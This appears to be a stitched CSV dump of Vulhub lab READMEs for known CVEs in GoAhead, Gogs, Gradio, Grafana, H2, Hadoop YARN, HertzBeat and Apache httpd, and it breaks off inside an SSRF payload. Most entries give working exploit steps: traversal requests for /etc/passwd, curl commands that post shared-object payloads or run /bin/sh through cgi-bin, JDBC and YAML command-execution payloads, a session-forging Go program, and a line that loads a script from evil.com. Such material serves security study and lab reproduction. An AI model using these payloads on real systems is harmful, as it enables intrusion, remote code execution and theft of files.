https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg

Vulnerable environment

Execute following commands to start a GoAhead 5.1.4:


docker compose up -d


Then, you can see the welcome page at http://your-ip:8080, CGI scripts is available at http://your-ip:8080/cgi-bin/index.

Exploit

First of all, compile this hijack code to a dynamic shared library:

C
include <unistd.h

static void beforemain(void) attribute_((constructor));

static void before_main(void)
{
    write(1, ""Hello: World\r\n\r\n"", 16);
    write(1, ""Hacked\n"", 7);
}


Please notice that, since GoAhead is a compact embedded webserver running on almost any possible IoT device, the format of dynamic shared library is always depending on the target server architecture. In the real world, compiling exploits is not as easy as this manual suggests, although Vulhub could show you a simplest example.

Compile on a x86/64 environment:


gcc -s -shared -fPIC ./payload.c -o payload.so


Then, we are using this script to reproduce the vulnerability.


python poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so


Hijack is successful:
-------------------------------------------------------------------------------","https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562
https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/
https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg
http://target-ip:8080/cgi-bin/index"
goahead,CVE-2017-17562,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562),"GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562)

中文版本(Chinese version)

Embedthis GoAhead is the world's most popular, tiny embedded web server, which is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices.

GoAhead before 3.6.5 allows remote code execution if CGI is enabled and a CGI program is dynamically linked. This is a result of initializing the environment of forked CGI scripts using untrusted HTTP request parameters in the cgiHandler function in cgi.c. When combined with the glibc dynamic linker, this behaviour can be abused for remote code execution using special parameter names such as LD_PRELOAD. An attacker can POST their shared object payload in the body of the request, and reference it using /proc/self/fd/0.

References:
https://www.elttam.com.au/blog/goahead/
https://www.exploit-db.com/exploits/43360
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb

Vulnerable environment

Execute following commands to start a GoAhead 3.6.4:


docker compose up -d


Then, you can see the welcome page at http://your-ip:8080, CGI scripts is available at http://your-ip:8080/cgi-bin/index.

Exploit

First of all, compile this hijack code to a dynamic shared library:

C
include <unistd.h

static void beforemain(void) attribute_((constructor));

static void before_main(void)
{
    write(1, ""Hello: World!\n"", 14);
}


Please notice that, since GoAhead is a compact embedded webserver running on almost any possible IoT device, the format of dynamic shared library is always depending on the target server architecture. In the real world, compiling exploits is not as easy as this manual suggests, although Vulhub could show you a simplest example.

Compile on a x86/64 environment:


gcc -shared -fPIC ./payload.c -o payload.so


Use curl to trigger the attack:


curl -X POST --data-binary @payload.so ""http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0"" -i 


The response header Hello: world! is printed to indicate that the code has been executed:



A reverse shell is got:
-------------------------------------------------------------------------------","https://www.elttam.com.au/blog/goahead/
https://www.exploit-db.com/exploits/43360
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb"
gogs,CVE-2018-18925,Gogs Session Overwrite and Arbitrary User Forge (CVE-2018-18925),"Gogs Session Overwrite and Arbitrary User Forge (CVE-2018-18925)

中文版本(Chinese version)

Gogs is a painless self-hosted Git service.

Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a .. session-file forgery in the file session provider in file.go. This is related to session ID handling in the go-macaron/session code for Macaron.

References:
<https://github.com/gogs/gogs/issues/5469
<https://xz.aliyun.com/t/3168
<https://www.anquanke.com/post/id/163575

Vulnerable environment

Execute following command to start a Gogs server 0.11.66:


docker compose up -d


After the server is started, you can see the installation page on http://your-ip:3000. Follow the instructions to initialize the application, keep in mind that use SQLite as the database provider and enable the user register.

Restart the server by docker compose restart after the installation, otherwise the session won't be stored in the filesystem.

Exploit

Before the exploit, use Gob to generate a evil session file:

go
package main

import (
    ""bytes""
    ""encoding/gob""
    ""encoding/hex""
    ""fmt""
    ""io/ioutil""
    ""os""
)

func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
    for _, v := range obj {
        gob.Register(v)
    }
    buf := bytes.NewBuffer(nil)
    err := gob.NewEncoder(buf).Encode(obj)
    return buf.Bytes(), err
}

func main() {
    var uid int64 = 1
    obj := map[interface{}]interface{}{""olduid"": ""1"", ""uid"": uid, ""uname"": ""root""}
    data, err := EncodeGob(obj)
    if err != nil {
        fmt.Println(err)
    }
    err = ioutil.WriteFile(""data"", data, os.OCREATE|os.OWRONLY)
    if err != nil {
        fmt.Println(err)
    }
    edata := hex.EncodeToString(data)
    fmt.Println(edata)
}


Sign up a normal user account, then create a project and upload the generated evil file on release page:



Get the aboslute file path from the attachment URL, for example ./attachments/2eb7f1a2-b5ec-482e-a297-15b625d24a10.

Finally, construct a malicious session id like ilikegogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10 and you can see that you are administrator (uid=1) now:



To execte commands as the administrator role, please refer to the reference links.
-------------------------------------------------------------------------------","https://github.com/gogs/gogs/issues/5469
https://xz.aliyun.com/t/3168
https://www.anquanke.com/post/id/163575"
gradio,CVE-2023-51449,Gradio File Path Traversal (CVE-2023-51449),"Gradio File Path Traversal (CVE-2023-51449)

中文版本(Chinese version)

Gradio is a Python library that allows users to quickly build visual web interfaces for machine learning models without writing any front-end code.

In Gradio versions 4.11 and below, when authentication is not enabled, an attacker who knows the file path can use a public URL to access arbitrary files on the server running the Gradio application.

References:
<https://github.com/gradio-app/gradio/pull/6833
<https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2

Environment Setup

Execute the following command to start an application built with Gradio 4.10.0:


docker compose up -d


After the server starts, authentication is disabled by default. You can access the application at http://your-ip:7860.

Vulnerability Reproduction

First, use the upload interface to upload any file and obtain an accessible file path.


POST /upload HTTP/1.1
Host: localhost:7860
Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
----------------------------250033711231076532771336998311
Content-Disposition: form-data; name=""files"";filename=""okmijnuhbygv""
Content-Type: application/octet-stream

123456
----------------------------250033711231076532771336998311--





Once you have an accessible file path, use the /file interface with directory traversal to read arbitrary files from the server, such as /etc/passwd:


GET /file=/tmp/gradio/7c4a8d09ca3762af61e59520943dc26494f8941b/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: localhost:7860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.36
Connection: close
Accept-Encoding: gzip
-------------------------------------------------------------------------------","https://github.com/gradio-app/gradio/pull/6833
https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2"
gradio,CVE-2024-1561,Gradio Arbitrary File Read (CVE-2024-1561),"Gradio Arbitrary File Read (CVE-2024-1561)

中文版本(Chinese version)

Gradio is a Python library that enables users to rapidly build web-based interfaces for machine learning models without writing any front-end code.

In Gradio versions prior to 4.13, the componentserver endpoint allows attackers to invoke arbitrary methods of the Component class. By abusing the moveresourcetoblock_cache method, an attacker can copy any file from the server to a temporary directory and then retrieve its contents, leading to arbitrary file read.

References:
<https://github.com/gradio-app/gradio/pull/6884
<https://nvd.nist.gov/vuln/detail/CVE-2024-1561

Environment Setup

Execute the following command to start an application written by Gradio 4.12.0:


docker compose up -d


After the environment is started, authentication is not enabled by default. You can access the application through http://your-ip:7860.

Vulnerability Reproduction

First, access the /config endpoint to obtain a component's id value, such as 3.


GET /config HTTP/1.1
Host: 127.0.0.1:7860




Next, use the moveresourcetoblockcache method to copy /etc/passwd to a temporary directory. The response will include the temporary file path.


POST /component_server HTTP/1.1
Host: 127.0.0.1:7860
Content-Type: application/json

{
  ""component_id"": ""3"",
  ""data"": ""/etc/passwd"",
  ""fnname"": ""moveresourcetoblock_cache"",
  ""session_hash"": ""aaaaaaaaaaa""
}




Finally, access the /file endpoint with the returned path to read the file content.


GET /file=/tmp/gradio/916eb712d668cf14a35adf8179617549780c4070/passwd HTTP/1.1
Host: 127.0.0.1:7860





If successful, the contents of /etc/passwd will be displayed, demonstrating arbitrary file read.
-------------------------------------------------------------------------------","https://github.com/gradio-app/gradio/pull/6884
https://nvd.nist.gov/vuln/detail/CVE-2024-1561"
grafana,Unknown,Grafana Admin Portal SSRF,"Grafana Admin Portal SSRF

中文版本(Chinese version)

Grafana is a multi-platform open source analytics and interactive visualization web application.

The admin user is able to make requests to an unintended location in all versions of Grafana.

References:
<https://github.com/RandomRobbieBF/grafana-ssrf

Vulnerable environment

Execute following command to start a Grafana 8.5.4:


docker compose up -d


Then you can see the portal page for Grafana without the authentication in http://your-ip:3000, because this server enabled the anonymous as admins by:

ini
[auth.anonymous]
enabled = true
org_role = Admin


If Grafana ask you for user credentials in real world, can try default admin and admin.

Vulnerability Reproduce

Use this POC to reproduce the SSRF:


python grafana-ssrf.py -H http://your-ip:3000 -u http://example.interact.sh/attack




As you can see, I got the request from Grafana:
-------------------------------------------------------------------------------","https://github.com/RandomRobbieBF/grafana-ssrf
http://your-ip:3000
http://example.interact.sh/attack"
grafana,CVE-2021-43798,Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798),"Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798)

中文版本(Chinese version)

Grafana is a multi-platform open source analytics and interactive visualization web application.

In December 2021, a Twitter user disclosed a 0day vulnerability, that unauthenticated attackers could use this vulnerability to step up web path and download arbitrary files through a craft url of Grafana 8.x.

References:
https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
https://twitter.com/hacker_/status/1467880514489044993
https://nosec.org/home/detail/4914.html
https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw

Vulnerable environment

Execute following command to start a Grafana server 8.2.6:


docker compose up -d


After the server start, you can browse the login page at http://your-ip:3000, no credential for this vulnerability.

Exploit

The vulnerability is caused by plugin module, which is able to serve the static file inside the plugin folder. But for lock of check, attacker can use ../ to step up from the plugin folder to parent foler and download arbitrary files.

To exploit the vulnerabilty, you should know a valid plugin id, such as alertlist, here are some of common plugin ids:


alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text


Send following request to retrieve the /etc/passwd (you can replace the alertlist with any valid plugin id):


GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.1.112:3000
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
-------------------------------------------------------------------------------","https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
https://twitter.com/hacker_/status/1467880514489044993
https://nosec.org/home/detail/4914.html
https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw"
h2database,CVE-2022-23221,H2 Database Web Console Pre-Auth JDBC Attack RCE (CVE-2022-23221),"H2 Database Web Console Pre-Auth JDBC Attack RCE (CVE-2022-23221)

中文版本(Chinese version)

H2 database is a fast, open-source Java-based relational database management system (RDBMS) that can be used in both embedded (within a Java application) and client-server modes.

Springboot with h2 database comes with a web management page if you set the following options:


spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true


In version 1.4.198, the H2 Web console restricted the creation of file databases or connecting to in-memory databases, thus fixing the CVE-2018-10054 vulnerability. However, attackers could bypass this restriction using JDBC attacks and some tricks in versions 1.4.198 up to (but not including) 2.1.210, and still execute arbitrary code.

References:
<https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf
<https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html
<https://github.com/h2database/h2database/releases/tag/version-2.1.210
<https://github.com/h2database/h2database/pull/1580
<https://github.com/h2database/h2database/pull/1726

Environment Setup

Start a spring-boot with h2 database 2.0.206:


docker compose up -d


After started the container, the spring-boot is listening on http://your-ip:8080, the management page is http://your-ip:8080/h2-console/ by default.

Vulnerability Reproduce

Before reproducing this issue, we can confirm that the payload in CVE-2018-10054 is not exploitable because in-memory database is disabled after 1.4.197:



Starting with version 1.4.197, the H2 console appends ;FORBIDCREATION=TRUE to the JDBC URL by default, preventing the creation of file databases or connections to in-memory databases. However, attackers can bypass this restriction by adding a \ at the end of the JDBC URL, which disrupts the URL syntax and causes FORBIDCREATION to be ignored.

Combining this trick with JDBC attacks, we can construct following malicious JDBC URL:


jdbc:h2:mem:test;MODE=MSSQLServer;FORBIDCREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATIONSCHEMA.TABLES AS $$//javascript
    var is = java.lang.Runtime.getRuntime().exec(""id"").getInputStream()
    var scanner = new java.util.Scanner(is).useDelimiter(""\\A"")
    throw new java.lang.Exception(scanner.next())
$$;AUTHZPWD=\


When logging into the Web console, you can run arbitrary commands using the provided URL (pay attention to the line breaks):
-------------------------------------------------------------------------------","https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf
https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html
https://github.com/h2database/h2database/releases/tag/version-2.1.210
https://github.com/h2database/h2database/pull/1580
https://github.com/h2database/h2database/pull/1726"
h2database,CVE-2021-42392,H2 Database Web Console Pre-Auth JNDI Injection RCE (CVE-2021-42392),"H2 Database Web Console Pre-Auth JNDI Injection RCE (CVE-2021-42392)

中文版本(Chinese version)

H2 database is a fast, open-source Java-based relational database management system (RDBMS) that can be used in both embedded (within a Java application) and client-server modes.

Springboot with h2 database comes with a web management page if you set the following options:


spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true


H2 Database version before 1.4.206 with this management page supports to use JNDI to load the JDBC driver, which can lead to remote code execution via JNDI injection.

References:
<https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
<https://mp.weixin.qq.com/s?biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e
<https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037
<https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6

Setup

Start a spring-boot with h2 database 2.0.204:


docker compose up -d


After started the container, the spring-boot is listening on http://your-ip:8080, the management page is http://your-ip:8080/h2-console/ by default.

Vulnerability Reproduce

Before reproducing this issue, we can confirm that the payload in CVE-2018-10054 is not exploitable because in-memory database is disabled after 1.4.197:



The H2 console after version 1.4.197 added a new -ifNotExists option that disable remote database creation by default. So you are unable to authenticate the H2 console without a known database file, such as in-memory database.

However, the H2 console still supports JNDI injection, which can be used to execute arbitrary code.

Simply use the Java-Chains to exploit the vulnerability.

First, generate the malicious JNDI URL by using the JNDI/JNDIResourceRefPayload module (don't forget to input the command you want to execute):



Then, go to the H2 Web console login page, enter javax.naming.InitialContext as the Driver class, and the JNDI URL generated by Java-Chains as the JDBC URL.



As you can see, the command has been executed successfully:
-------------------------------------------------------------------------------","https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e
https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037
https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6"
h2database,CVE-2018-10054,H2 Database Web Console Authentication Remote Code Execution (CVE-2018-10054),"H2 Database Web Console Authentication Remote Code Execution (CVE-2018-10054)

中文版本(Chinese version)

H2 database is a fast, open-source Java-based relational database management system (RDBMS) that can be used in both embedded (within a Java application) and client-server modes.

Springboot with h2 database comes with a web management page if you set the following options:


spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true


H2 Database versions prior to 1.4.198 allow any user to access the web management page by creating a new database file or connecting to an in-memory database. After authentication, an arbitrary code can be executed by one of the following commands:
RUNSCRIPT FROM 'http://evil.com/script.sql'
CREATE ALIAS func AS code...; CALL func ...
CREATE TRIGGER ... AS code...

References:
<https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
<https://www.exploit-db.com/exploits/45506
<https://github.com/h2database/h2database/issues/1225
<https://github.com/h2database/h2database/pull/1580
<https://github.com/h2database/h2database/pull/1726

Setup

Start a spring-boot with h2 database 1.4.197:


docker compose up -d


After started the container, the spring-boot is listening on http://your-ip:8080, the management page is http://your-ip:8080/h2-console/ by default.

Vulnerability Reproduce

First, login the H2 web console by connecting to the in-memory database:


jdbc:h2:mem:test




Then, execute the following commands to execute the id command:

sql
CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    var is = java.lang.Runtime.getRuntime().exec(""id"").getInputStream()
    var scanner = new java.util.Scanner(is).useDelimiter(""\\A"")
    throw new java.lang.Exception(scanner.next())
$$;


As you can see, the id command is executed successfully and the result is raised as an exception.
-------------------------------------------------------------------------------","https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
https://www.exploit-db.com/exploits/45506
https://github.com/h2database/h2database/issues/1225
https://github.com/h2database/h2database/pull/1580
https://github.com/h2database/h2database/pull/1726"
hadoop,Unknown,Hadoop YARN ResourceManager Unauthorized Access,"Hadoop YARN ResourceManager Unauthorized Access

中文版本(Chinese version)

Hadoop YARN (Yet Another Resource Negotiator) is Apache Hadoop's cluster resource management system. If the YARN ResourceManager is exposed to the public internet without proper access controls, an attacker can submit and execute arbitrary applications on the cluster.

References:
<http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
<https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html

Environment Setup

Execute the following command to start vulnerable Hadoop YARN environment:


docker compose up -d


After the environment starts, visit http://your-ip:8088 to access the Hadoop YARN ResourceManager WebUI.

Vulnerability Reproduction

The exploitation method differs slightly from the original presentation. Even without a Hadoop client, you can submit tasks directly through the REST API (https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html).

The exploitation process is as follows:

1. Set up a listener on your local machine to receive the reverse shell connection
2. Call the New Application API to create an Application
3. Call the Submit Application API to submit the malicious application

For detailed implementation, refer to the exploit script.
-------------------------------------------------------------------------------","http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html"
hertzbeat,CVE-2024-42323,Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323),"Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323)

中文版本(Chinese version)

Apache HertzBeat is an open-source real-time monitoring and alarm tool that supports monitoring of operating systems, middleware, databases, and more through its web interface.

In versions prior to 1.6.0, HertzBeat uses a vulnerable version of SnakeYAML library for parsing YAML files. When authenticated users import new monitoring types through the /api/monitors/import or /api/alert/defines/import APIs, they can provide specially crafted YAML content that triggers deserialization of untrusted data, potentially leading to remote code execution on the target system.

References:
<https://forum.butian.net/article/612
<https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
<https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md

Environment Setup

Execute the following command to start a vulnerable HertzBeat 1.4.4 instance:


docker compose up -d


After the service is started, you can access the HertzBeat dashboard at http://your-ip:1157/dashboard. The default login credentials are:
Username: admin
Password: hertzbeat

Vulnerability Reproduction

First prepare a malicious YAML file that filename ends with .yaml:

yaml
!!org.h2.jdbc.JdbcConnection [ ""jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\""touch /tmp/success\"")\\; }$$\\;CALL EXEC ()\\;"", [], ""a"", ""b"", false ]


Then log into the HertzBeat dashboard, navigate to any monitor page and locate the import button. The interface allows users to import monitor configurations through YAML files, upload the malicious YAML file:



When the malicious YAML file is imported through the web interface, HertzBeat will attempt to deserialize its contents, triggering the remote code execution:



If successful, the payload will execute on the target system. In this example, we can verify the execution by checking for the presence of a newly created file in the container:
-------------------------------------------------------------------------------","https://forum.butian.net/article/612
https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md"
httpd,Unknown,"[deprecated] 绝版apache+php

允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。

镜像地址：vulhub/httpd:bad-http
-------------------------------------------------------------------------------","[deprecated] 绝版apache+php

允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。

镜像地址：vulhub/httpd:bad-http
-------------------------------------------------------------------------------",
httpd,CVE-2021-42013,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013),"Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013)

中文版本(Chinese version)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

CVE-2021-42013 is a vulnerability that caused by incomplete fix of CVE-2021-41773, an attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

This vulnerability affects Apache HTTP Server 2.4.49 and 2.4.50 and not earlier versions.

References:
https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/roman_soft/status/1446252280597078024

Vulnerable environment

Execute following commands to start a vulnerable Apache HTTP Server:


docker compose build
docker compose up -d


After the server is started, you can see the default page which says It works! of Apache HTTP Server through http://your-ip:8080.

Exploit

Apache HTTP Server 2.4.50 patched the previous CVE-2021-41773 payload such as http://your:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd, but it was incomplete.

Use .%%32%65 to bypass the patches (Note that /icons/ must be a existing directory):


curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd


The /etc/passwd is disclosured successfully:



With the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:


curl -v --data ""echo;id"" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/roman_soft/status/1446252280597078024
http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
httpd,CVE-2021-41773,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773),"Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773)

中文版本(Chinese version)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root.

If files outside of these directories are not protected by the usual default configuration ""require all denied"", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

References:
https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/ptswarm/status/1445376079548624899
https://twitter.com/HackerGautam/status/1445412108863041544
https://twitter.com/snyff/status/1445565903161102344

Vulnerable environment

Execute following commands to start a vulnerable Apache HTTP Server:


docker compose build
docker compose up -d


After the server is started, you can see the default page which says It works! of Apache HTTP Server through http://your-ip:8080.

Exploit

A simple CURL command to reproduce the vulnerability (Note that /icons/ must be a existing directory):


curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd


The /etc/passwd is disclosured successfully:



With the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:


curl -v --data ""echo;id"" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/ptswarm/status/1445376079548624899
https://twitter.com/HackerGautam/status/1445412108863041544
https://twitter.com/snyff/status/1445565903161102344
http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
httpd,CVE-2021-40438,Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438),"Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438)

中文版本(Chinese version)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

A Server-Side Request Forgery (SSRF) flaw was found in mod_proxy of httpd. This flaw allows a remote, unauthenticated attacker to make the httpd server forward requests to an arbitrary server. The attacker could get, modify, or delete resources on other services that may be behind a firewall and inaccessible otherwise. The impact of this flaw varies based on what services and resources are available on the httpd network.

References:
https://httpd.apache.org/security/vulnerabilities_24.html
https://firzen.de/building-a-poc-for-cve-2021-40438
https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html

Vulnerable environment

Execute following commands to start a vulnerable Apache HTTP Server:


docker compose build
docker compose up -d


After the server is started, you can see the example site of a backend Apache Tomcat server. Here, Apache HTTP Server is running as a intermediate reverse proxy between the client and the back-end Tomcat server, and they communicate through the AJP protocol.

Exploit

Send the following request to exploit the SSRF vulnerability:


GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA